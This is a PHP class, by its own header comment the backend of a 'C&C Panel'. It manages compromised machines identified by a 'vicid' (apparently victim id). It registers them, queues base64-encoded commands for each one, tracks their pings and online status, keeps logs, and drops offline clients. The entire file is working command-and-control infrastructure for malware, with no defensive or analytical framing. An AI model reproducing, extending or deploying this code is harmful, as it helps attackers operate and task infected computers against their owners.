<?php
/*
Class to handle clients and C&C Panel
using HTTP and MySQL
 */
class Clients extends Database
{

    // Create a new client
    public function newClient($clientdata)
    {
        try {
            if ($this->isExist($clientdata['vicid'], "clients")) {
                $this->updateClient($clientdata);
            } else {
                $pdo = $this->Connect();
                $sql = sprintf("INSERT INTO %s (%s) VALUES (%s)", "clients", implode(", ", array_keys($clientdata)), ":" . implode(",:", array_keys($clientdata)));
                $stmt = $pdo->prepare($sql);
                $stmt->execute($clientdata);
                // create a new command
                $this->createCommand($clientdata['vicid']);
                return 'Client Created';
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // Remove a client from the database
    public function removeClient($clientID)
    {
        try {
            $this->removeCommands($clientID);
            $pdo = $this->Connect();
            $sql = "DELETE FROM clients WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['id' => $clientID]);
            return 'Client Removed';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update a client
    public function updateClient(array $clientdata)
    {
        try {
            $pdo = $this->Connect();
            $query = sprintf('UPDATE %s SET ', "clients");
            foreach ($clientdata as $key => $value) {
                $query .= "$key=:$key, ";
            }

            $query = rtrim($query, ", ");
            $query .= sprintf(' WHERE vicid = %s', ":vicid");

            $stmt = $pdo->prepare($query);
            $stmt->execute($clientdata);
            return 'Client Updated';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // check if a client exist
    public function isExist($clientID, $table_name)
    {
        try {
            $pdo = $this->Connect();
            $sql = $pdo->prepare(sprintf("SELECT * FROM %s WHERE vicid = :id", $table_name));
            $sql->execute(['id' => $clientID]);
            if ($sql->rowCount()) {
                return true;
            } else {
                return false;
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // get all clients from database
    public function getClients()
    {
        try {
            $pdo = $this->Connect();
            $sql = "SELECT * FROM clients";
            $stmt = $pdo->prepare($sql);
            $stmt->execute();
            $data = $stmt->fetchAll();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // Count all clients
    public function countClients()
    {
        try {
            $pdo = $this->Connect();
            $sql = "SELECT COUNT(*) FROM clients";
            $stmt = $pdo->prepare($sql);
            $stmt->execute();
            $data = $stmt->fetchColumn();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // get 1 client from the database using vicid
    public function getClient($vicID)
    {
        try {
            $pdo = $this->Connect();
            $sql = "SELECT * FROM clients WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['id' => $vicID]);
            $data = $stmt->fetch();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // count online clients
    public function countClientsByCond($column_name, $cond)
    {
        try {
            $pdo = $this->Connect();
            $sql = sprintf("SELECT COUNT(*) FROM clients WHERE %s = :cond", $column_name);
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['cond' => $cond]);
            $data = $stmt->fetchColumn();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update a client status online/offline
    public function updateStatus($vicID, $status)
    {
        try {
            $pdo = $this->Connect();
            $sql = "UPDATE clients SET status = :stats WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['stats' => $status, ':id' => $vicID]);
            return 'Updated';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function new_log($vicid, $type, $message)
    {
        try {
            $pdo = $this->Connect();
            $sql = "INSERT INTO logs(vicid,type,message) VALUES (:vicid,:type,:message)";
            $stmt = $pdo->prepare($sql);

            $stmt->execute(['vicid' => $vicid, 'type' => $type, 'message' => $message]);
            // create a new command
            return 'Log Created';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function getLogs()
    {
        try {
            $pdo = $this->Connect();
            $sql = "SELECT * FROM logs";
            $stmt = $pdo->prepare($sql);
            $stmt->execute();
            $data = $stmt->fetchAll();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }
    public function deleteLog($id)
    {
        try {
            $pdo = $this->Connect();
            $sql = "DELETE FROM logs WHERE id = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['id' => $id]);
        } catch (\Throwable $th) {
        }
    }

    // get the last command using vicid
    public function getCommand($vicID)
    {
        try {
            $pdo = $this->Connect();
            $sql = "SELECT * FROM commands WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['id' => $vicID]);
            $data = $stmt->fetch();
            return $data;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // update all clients status offline/online
    public function updateAllStatus($status)
    {
        try {
            $pdo = $this->Connect();
            $sql = "UPDATE clients SET status = :stats";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['stats' => $status]);
            return 'Updated';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // create a new command using vicid
    public function createCommand($vicID)
    {
        try {
            if ($this->isExist($vicID, "commands")) {
                $this->updateCommands($vicID, base64_encode("Ping"));
            } else {
                $pdo = $this->Connect();
                $sql = "INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)";
                $stmt = $pdo->prepare($sql);
                $stmt->execute(['vicid' => $vicID, 'cmd' => base64_encode("Ping")]);
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function pinged($vicid, $old_pings)
    {
        $pdo = $this->Connect();
        $pinged_at = date("m/d/Y H:i:s", time());
        $sql = "UPDATE clients SET pings = :ping,update_at = :update_at WHERE vicid = :vicid";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['ping' => $old_pings + 1, "update_at" => $pinged_at, 'vicid' => $vicid]);
    }

    // update a command if a client exist
    public function updateCommands($vicID, $command)
    {
        try {
            $pdo = $this->Connect();
            $sql = "UPDATE commands SET command = :cmd WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['cmd' => $command, ':id' => $vicID]);
            return true;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    // remove command after uninstalling a client
    public function removeCommands($vicID)
    {
        try {
            $pdo = $this->Connect();
            $sql = "DELETE FROM commands WHERE vicid = :id";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['id' => $vicID]);
            return 'Client Removed';
        } catch (\Throwable $th) {
            //throw $th;
        }
    }

    public function pingClients()
    {
        try {
            $allclients = $this->getClients();
            foreach ($allclients as $client) {
                if ($this->updateCommands($client->vicid, base64_encode("Ping"))) {
                    $diff = time() - strtotime($client->update_at);
                    $hrs = round($diff / 3600);

                    if ($hrs >= 1) {
                        $this->updateStatus($client->vicid, "Offline");
                    } else {
                        $this->updateStatus($client->vicid, "Online");
                    }
                }
            }
            return true;
        } catch (\Throwable $th) {
            return false;
        }
    }

    public function uninstallOfflineClients()
    {
        try {
            $allclients = $this->getClients();
            foreach ($allclients as $client) {
                if ($client->status == "Offline") {
                    $this->removeClient($client->vicid);
                }
            }
            return true;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }
}
